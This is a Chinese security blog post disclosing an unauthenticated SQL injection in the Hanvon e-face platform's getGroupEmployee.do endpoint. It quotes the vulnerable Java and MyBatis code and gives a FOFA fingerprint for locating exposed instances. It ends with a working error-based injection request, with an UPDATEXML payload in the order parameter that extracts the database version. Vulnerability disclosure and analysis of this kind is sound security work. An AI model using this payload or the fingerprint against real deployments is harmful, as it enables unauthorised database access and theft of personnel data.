---
title: "汉王e脸通综合管理平台 getGroupEmployee.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getGroupEmployee-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getgroupemployee.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getGroupEmployee.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/4 08:32
- 1357浏览
- [4评论](#comment)
- 42分钟阅读

深入探索

计算机安全

认证

sql

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getGroupEmployee.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

Windows安全工具

在线安全工具

Web安全课程

直接看 `AuthMultiplePeopleOpenController` 里关于 `getGroupEmployee` 的实现

```
@RequestMapping(
        value = {"getGroupEmployee.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson getGroupEmployee(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String name, @RequestParam(required = false) Long groupId, @RequestParam(required = false) Long departmentId, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            PageHelper.startPage(page, pageSize);
            EmployeeInfoParam record = new EmployeeInfoParam();
            if (name != null) {
                record.setKey(name);
            }

            if (null != departmentId) {
                record.setDepartmentId(departmentId);
            }

            record.setOrder(order);
            record.setColumnKey(columnKey);
            if (null == groupId) {
                result.setSuccess(false);
                result.setMsg(getMessage("basics_operate_fail"));
            } else {
                record.setTeamId(groupId);
                List<EmployeeInfoVO> employeeList = this.authMultiplePeopleOpenAsm.getGroupEmployee(record);
                PageInfo<EmployeeInfoVO> info = new PageInfo(employeeList);
                result.setSuccess(true);
                result.setObj(info);
            }
        } catch (Exception e) {
            String msg = getMessage("basics_go_wrong") + e.getLocalizedMessage();
            result = RequestJson.errorResult(result, msg);
            this.logger.error(msg);
            e.printStackTrace();
        }

        return result;
    }
```

深入探索

传输层安全性协议

漏洞扫描器

安全研究报告

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccesManyPeopleGroupDao.xml

代码安全审计

```
<select id="getGroupEmployee" resultType="com.hanvon.iface.tpm.access.EmployeeInfoVO">
    select AMGE.ID, ei.SZ_NAME NAME,ei.SZ_USER_NAME employeeNum,ei.SZ_EMPLOY_ID as attendanceCode,sub.NG_BRANCH_ID departmentId,ei.SZ_TELEPHONE PHONE,ed.SZ_NAME departmentName
    from ACCESS_MANY_GROUP_EMPLOYEE AMGE
    left join SYS_USER ei ON ei.NG_ID = AMGE.EMPLOYEE_ID
    left join SYS_USER_BRANCH sub ON sub.ng_user_id = ei.NG_ID
    left join SYS_BRANCH ed on ed.NG_ID = sub.NG_BRANCH_ID
    where ei.nt_user_state = 1
    <if test="teamId != null">
      and AMGE.GROUP_ID = #{teamId}
    </if>
    <if test="key != null and key != ''">
      and (ei.SZ_NAME like CONCAT('%',#{key}, '%')
      or  ei.SZ_USER_NAME like concat('%', #{key},'%')
      or  ei.SZ_TELEPHONE like concat('%', #{key},'%')
      or  ei.SZ_MOBILE like concat('%', #{key},'%')
      or  ei.SZ_EMPLOY_ID like concat('%', #{key},'%'))
    </if>
    <if test="departmentId != null">
      AND ed.SZ_BRANCH_PATH like CONCAT((SELECT SZ_BRANCH_PATH from SYS_BRANCH WHERE NG_ID = #{departmentId,jdbcType=INTEGER}), '%')
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      AMGE.ID DESC
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

需要注意必须存在 `groupId` 参数，否则就不会进入sql处理流程。

漏洞修复方案

```
if (null == groupId) {
    result.setSuccess(false);
    result.setMsg(getMessage("basics_operate_fail"));
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/authMultiplePeople/getGroupEmployee.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getGroupEmployee.do SQL注入漏洞](images/img-001-b3b1996b0609.webp)](https://image.mrxn.net/ba75dd3cc9d941f991fca065ad7c8ae3.webp)

成功利用报错注入获取到数据版本号

物流软件安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
